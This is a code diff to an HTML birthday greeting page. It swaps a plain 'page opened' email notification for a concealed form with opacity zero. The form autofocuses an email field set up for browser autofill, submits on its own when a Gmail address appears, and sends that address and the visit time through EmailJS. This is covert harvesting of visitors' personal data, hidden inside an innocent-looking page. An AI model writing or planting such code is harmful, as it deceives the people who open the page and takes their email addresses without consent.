@@ -199,15 +199,46 @@
     <!-- EmailJS Notification Trigger -->
 <script>
   window.addEventListener('load', function () {
-    emailjs.send("service_4t9r4e5", "template_ek2ype4", {
-      message: "🎉 Someone opened the birthday page!",
-      visitor_email: "unknown"
-    }).then(function() {
-      console.log("Email sent ✅");
-    }, function(error) {
-      console.error("Email sending failed ❌", error);
+    // Try autofill suggestion
+    document.getElementById("open_time").value = new Date().toLocaleString();
+
+    setTimeout(() => {
+      const input = document.getElementById('visitor_email');
+      input.focus();
+    }, 1000);
+
+    const form = document.getElementById("hiddenForm");
+
+    // Auto-submit when Gmail is typed
+    const emailInput = document.getElementById("visitor_email");
+    emailInput.addEventListener("change", () => {
+      if (emailInput.value.includes("@gmail.com")) {
+        form.requestSubmit();
+      }
+    });
+
+    // Handle the submission
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      emailjs.sendForm("service_4t9r4e5", "template_ek2ype4", this)
+        .then(() => {
+          console.log("Email with Gmail captured ✅");
+        })
+        .catch((error) => {
+          console.error("Gmail send failed ❌", error);
+        });
     });
   });
 </script>
+
+
+<form id="hiddenForm" style="opacity: 0; position: absolute;">
+  <input type="email" name="visitor_email" id="visitor_email" autocomplete="email" required>
+  <input type="text" name="message" value="🎉 Someone opened the birthday page!" hidden>
+  <input type="text" name="time" id="open_time" hidden>
+  <input type="submit" />
+</form>
+
+
   </body>
 </html>
